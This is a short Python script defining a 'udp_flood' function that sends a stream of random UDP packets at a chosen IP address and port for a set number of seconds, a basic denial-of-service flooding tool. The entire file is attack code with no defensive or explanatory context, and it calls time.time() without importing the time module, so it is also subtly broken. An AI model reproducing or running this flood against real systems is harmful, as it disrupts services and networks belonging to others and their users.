import socket
import random

def udp_flood(target_ip, target_port, duration=10, packet_size=1024):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(packet_size)
    timeout = time.time() + duration
    
    try:
        while time.time() < timeout:
            sock.sendto(bytes, (target_ip, target_port))
        print(f"UDP flood to {target_ip}:{target_port} completed")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        sock.close()
